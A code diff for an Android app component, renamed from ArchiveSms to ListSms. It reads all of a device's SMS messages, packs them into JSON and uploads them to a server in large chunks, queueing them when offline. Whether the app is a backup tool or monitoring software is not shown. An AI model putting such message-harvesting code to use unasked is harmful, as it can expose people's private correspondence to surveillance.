@@ -1,4 +1,4 @@
-package com.inet.android.archive;
+package com.inet.android.list;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -6,7 +6,6 @@ import org.json.JSONObject;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.SharedPreferences;
-import android.content.SharedPreferences.Editor;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.AsyncTask;
@@ -22,23 +21,22 @@ import com.inet.android.utils.Logging;
  * 
  * 
  */
-public class ArchiveSms extends AsyncTask<Context, Void, Void> {
+public class ListSms extends AsyncTask<Context, Void, Void> {
 	ConvertDate date;
 	Context mContext;
-	private String LOG_TAG = "Arhive SMS";
+	private String LOG_TAG = "ListSMS";
 	private String sendStr = null;
 	private String complete;
 	private String iType = "2";;
 	private Uri uri;
 	private Cursor sms_sent_cursor;
-	Editor ed;
 	SharedPreferences sp;
+	private TurnSendList sendList;
 
 	public void getSmsLogs() {
 
 		date = new ConvertDate();
 		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
-		ed = sp.edit();
 
 		// -------------- for---------------------------------------------
 
@@ -47,18 +45,22 @@ public class ArchiveSms extends AsyncTask<Context, Void, Void> {
 		sms_sent_cursor = mContext.getContentResolver().query(uri, null, null,
 				null, "date desc");
 		Logging.doLog(LOG_TAG,
-				"network" + sp.getBoolean("network_available", true), "network"
-						+ sp.getBoolean("network_available", true));
+				"network" + sp.getBoolean("network_available ", true),
+				"network " + sp.getBoolean("network_available ", true));
 		if (sp.getBoolean("network_available", true) == true) {
 			complete = "0";
 			// Read the sms data and store it in the list
 			if (sms_sent_cursor != null) {
 				// формируем JSONobj
 				JSONObject archiveSMSJson = new JSONObject();
+				Logging.doLog(LOG_TAG, "Sms_sent_cursor ..",
+						"Sms_sent_cursor ..");
 
 				if (sms_sent_cursor.moveToFirst()) {
 
 					for (int i = 0; i < sms_sent_cursor.getCount(); i++) {
+						Logging.doLog(LOG_TAG, "sms_sent_cursor.getCount()",
+								"sms_sent_cursor.getCount()");
 
 						int typeSms = sms_sent_cursor.getInt(sms_sent_cursor
 								.getColumnIndex("type"));
@@ -104,30 +106,36 @@ public class ArchiveSms extends AsyncTask<Context, Void, Void> {
 							e.printStackTrace();
 						}
 						if (sendStr.length() >= 50000) {
-							Logging.doLog(LOG_TAG, "str >= 50000 ..",
-									"str >= 50000 ..");
-							sendRequest(sendStr, complete);
-							sendStr = null;
+							if (sms_sent_cursor.isLast()) {
+								lastRaw(sendStr);
+
+							} else {
+								sendRequest(sendStr, complete);
+								sendStr = null;
+							}
 						}
 						sms_sent_cursor.moveToNext();
+
 					}
-
 				}
-				complete = "1";
-				Logging.doLog(LOG_TAG, "Send complete 1 ..",
-						"Send complete 1 ..");
-				sendRequest(sendStr, complete);
-				sendStr = null;
-				ed.putString("status_sms_list", "0");
+				if (sendStr != null) {
+					lastRaw(sendStr);
+				}
 				sms_sent_cursor.close();
-
-			} else
-				Logging.doLog(LOG_TAG, "Send Cursor is Empty",
-						"Send Cursor is Empty");
+			}
+		} else {
+			sendList = new TurnSendList(mContext);
+			sendList.setList(2, "1", "0");
 		}
-		ed.putString("status_sms_list", "1");
-		ed.commit();
+	}
 
+	private void lastRaw(String sendStr) {
+		complete = "1";
+		Logging.doLog(LOG_TAG, "Send complete 1 ..", "Send complete 1 ..");
+		sendRequest(sendStr, complete);
+		sendStr = null;
+		sendList = new TurnSendList(mContext);
+		sendList.setList(2, "0", "0");
 	}
 
 	private void sendRequest(String str, String complete) {
